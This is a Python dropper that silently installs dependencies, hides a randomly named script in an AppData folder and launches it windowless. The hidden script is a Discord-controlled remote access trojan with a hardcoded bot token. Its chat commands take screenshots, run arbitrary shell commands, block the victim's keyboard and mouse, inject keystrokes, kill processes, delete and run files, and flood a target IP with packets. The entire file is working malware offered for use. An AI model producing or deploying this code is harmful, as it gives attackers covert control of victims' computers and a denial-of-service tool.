import os
import subprocess
import sys
import random
import string
import ctypes

# Function to install pip packages silently
def install_packages():
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "discord.py", "pyautogui", "keyboard", "pyttsx3", "psutil"],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

# Run the pip installation silently
install_packages()

# Function to generate a random 6-character string
def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + ".py"

# Function to get the path for AppData
def get_appdata_path():
    appdata = os.getenv('APPDATA')
    if appdata:
        return os.path.join(appdata, "HiddenScripts")  # Folder inside AppData for hidden scripts
    else:
        raise Exception("AppData environment variable not found")

# Create the HiddenScripts directory if it doesn't exist
hidden_dir = get_appdata_path()
if not os.path.exists(hidden_dir):
    os.makedirs(hidden_dir)

# Generate random filename
script_filename = generate_random_filename()

# The multi-line string for the script content
code = '''import os
import subprocess
import sys
import discord
import pyautogui
import keyboard
import ctypes
import pyttsx3
import psutil
import socket
import random

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

TOKEN = 'MTMzMjY3NTA1NzM1NjUwNTA5OA.GNHF4b.9-nnc5-Xl4t5yDQwg438k08RtJ-d8_2rSkQiGs'

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    return 'screenshot.png'

def execute_command(command):
    return os.popen(command).read()

def speak_text(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def block_input(state):
    ctypes.windll.user32.BlockInput(state)

def get_usb_devices():
    output = subprocess.run("wmic path CIM_LogicalDevice where \\"Description like '%USB%'\\" get Description", shell=True, capture_output=True, text=True)
    devices = [line.strip() for line in output.stdout.split("\\n") if line.strip()]
    return "\\n".join(devices) if devices else "No USB devices found."

def list_processes():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
    return "\\n".join(processes) if processes else "No active processes found."

def kill_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        return f"Process {pid} terminated."
    except psutil.NoSuchProcess:
        return "Process not found."
    except psutil.AccessDenied:
        return "Permission denied to terminate the process."
    except Exception as e:
        return f"Error: {str(e)}"

def send_network_packets(protocol, ip, port, threads, packet_size):
    data = random._urandom(packet_size)
    if protocol.lower() == "tcp":
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    elif protocol.lower() == "udp":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    else:
        return "⚠️ Invalid protocol. Use TCP or UDP."

    for _ in range(threads):
        try:
            if protocol.lower() == "tcp":
                sock.connect((ip, int(port)))
                sock.send(data)
            elif protocol.lower() == "udp":
                sock.sendto(data, (ip, int(port)))
            return f"Sent {packet_size} bytes to {ip}:{port} using {protocol.upper()}."
        except Exception as e:
            return f"Error sending packet: {str(e)}"

def simulate_input(text):
    pyautogui.write(text)

@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    domain = os.getenv('COMPUTERNAME', 'Unknown')  # Get the computer name
    # Send the message with @everyone ping
    for guild in client.guilds:
        for channel in guild.text_channels:
            await channel.send(f'@everyone Client {domain} connected!!!')
            return  # Send message once and stop after the first channel

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    
    if message.content.lower() == "!help":
        commands_list = """1. !screenshot - Take a screenshot
2. !cmd <command> - Execute system command
3. !blockinput - Block keyboard/mouse
4. !unblockinput - Unblock keyboard/mouse
5. !speak <text> - Convert text to speech
6. !usb - Show connected USB devices
7. !processes - List active processes
8. !kill <PID> - Kill a process by PID
9. !input <text> - Simulate typing the text into the focused input box
10. !network <tcp|udp> <ip> <port> <threads> <packet_size> - Send network packets to a specified IP/Port using TCP/UDP
11. !pwd - Print current path
12. !all - Print all files (only files, not paths)
13. !delete <file path> <file name> - Delete file from path
14. !new <file name> <format> <inside thing> - Create new file with content inside
15. !rename <path> <file name> <new name> - Rename file
16. !newfolder <path> <folder name> - Create a new folder
17. !runfile <path> <file name> - Run a file"""
        await message.channel.send(commands_list)

    elif message.content.startswith("!screenshot"):
        screenshot_file = take_screenshot()
        await message.channel.send(file=discord.File(screenshot_file))

    elif message.content.startswith("!cmd"):
        command = message.content[len("!cmd "):]
        result = execute_command(command)
        await message.channel.send(f"Command result:\\n{result}")

    elif message.content.startswith("!blockinput"):
        block_input(True)
        await message.channel.send("🔒 Mouse & Keyboard Blocked!")

    elif message.content.startswith("!unblockinput"):
        block_input(False)
        await message.channel.send("✅ Mouse & Keyboard Unblocked!")

    elif message.content.startswith("!speak"):
        text = message.content[len("!speak "):].strip()
        speak_text(text)
        await message.channel.send(f"🗣️ Successfully Spoken: {text}")

    elif message.content.startswith("!usb"):
        usb_info = get_usb_devices()
        await message.channel.send(f"🔌 Connected USB devices:\\n{usb_info}")

    elif message.content.startswith("!processes"):
        processes = list_processes()
        await message.channel.send(f"Active Processes:\\n{processes}")

    elif message.content.startswith("!kill"):
        try:
            pid = int(message.content[len("!kill "):].strip())
            result = kill_process(pid)
            await message.channel.send(result)
        except ValueError:
            await message.channel.send("Please provide a valid PID.")

    elif message.content.startswith("!input"):
        input_text = message.content[len("!input "):].strip()
        simulate_input(input_text)
        await message.channel.send(f"📝 Successfully Typed: {input_text}")

    elif message.content.startswith("!network"):
        try:
            parts = message.content[len("!network "):].split()
            if len(parts) == 5:
                protocol, ip, port, threads, packet_size = parts
                threads = int(threads)
                packet_size = int(packet_size)
                result = send_network_packets(protocol, ip, port, threads, packet_size)
                await message.channel.send(result)
            else:
                await message.channel.send("⚠️ Invalid command format.")
        except Exception as e:
            await message.channel.send(f"⚠️ Error: {str(e)}")

    elif message.content.startswith("!pwd"):
        current_path = os.getcwd()
        await message.channel.send(f"Current path: {current_path}")

    elif message.content.startswith("!all"):
        files = [f for f in os.listdir() if os.path.isfile(f)]
        await message.channel.send("Files in the current directory: " + ", ".join(files))

    elif message.content.startswith("!delete"):
        try:
            parts = message.content[len("!delete "):].split()
            if len(parts) == 2:
                path, filename = parts
                file_path = os.path.join(path, filename)
                if os.path.exists(file_path):
                    os.remove(file_path)
                    await message.channel.send(f"File {filename} deleted.")
                else:
                    await message.channel.send(f"File {filename} not found.")
            else:
                await message.channel.send("⚠️ Invalid command format.")
        except Exception as e:
            await message.channel.send(f"⚠️ Error: {str(e)}")

    elif message.content.startswith("!new"):
        try:
            parts = message.content[len("!new "):].split(" ", 2)
            if len(parts) == 3:
                filename, file_format, content = parts
                file_path = os.path.join(os.getcwd(), f"{filename}{file_format}")
                with open(file_path, "w") as f:
                    f.write(content)
                await message.channel.send(f"New file {filename}{file_format} created.")
            else:
                await message.channel.send("⚠️ Invalid command format.")
        except Exception as e:
            await message.channel.send(f"⚠️ Error: {str(e)}")

    elif message.content.startswith("!rename"):
        try:
            parts = message.content[len("!rename "):].split()
            if len(parts) == 3:
                path, old_name, new_name = parts
                old_file = os.path.join(path, old_name)
                new_file = os.path.join(path, new_name)
                if os.path.exists(old_file):
                    os.rename(old_file, new_file)
                    await message.channel.send(f"File renamed to {new_name}.")
                else:
                    await message.channel.send(f"File {old_name} not found.")
            else:
                await message.channel.send("⚠️ Invalid command format.")
        except Exception as e:
            await message.channel.send(f"⚠️ Error: {str(e)}")

    elif message.content.startswith("!newfolder"):
        try:
            parts = message.content[len("!newfolder "):].split()
            if len(parts) == 2:
                path, folder_name = parts
                folder_path = os.path.join(path, folder_name)
                os.makedirs(folder_path, exist_ok=True)
                await message.channel.send(f"Folder {folder_name} created.")
            else:
                await message.channel.send("⚠️ Invalid command format.")
        except Exception as e:
            await message.channel.send(f"⚠️ Error: {str(e)}")

    elif message.content.startswith("!runfile"):
        try:
            parts = message.content[len("!runfile "):].split()
            if len(parts) == 2:
                path, filename = parts
                file_path = os.path.join(path, filename)
                if os.path.exists(file_path):
                    subprocess.run(["python", file_path], shell=True)
                    await message.channel.send(f"File {filename} executed.")
                else:
                    await message.channel.send(f"File {filename} not found.")
            else:
                await message.channel.send("⚠️ Invalid command format.")
        except Exception as e:
            await message.channel.send(f"⚠️ Error: {str(e)}")

client.run(TOKEN)'''

# Write the script to the hidden directory
script_path = os.path.join(hidden_dir, script_filename)
with open(script_path, "w", encoding="utf-8") as f:  # Use UTF-8 encoding
    f.write(code)

# Run the script silently
subprocess.Popen(
    [sys.executable, script_path],
    creationflags=subprocess.CREATE_NO_WINDOW,  # Run without a window
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    stdin=subprocess.DEVNULL
)

# Stop the idle program (original script)
sys.exit(0)
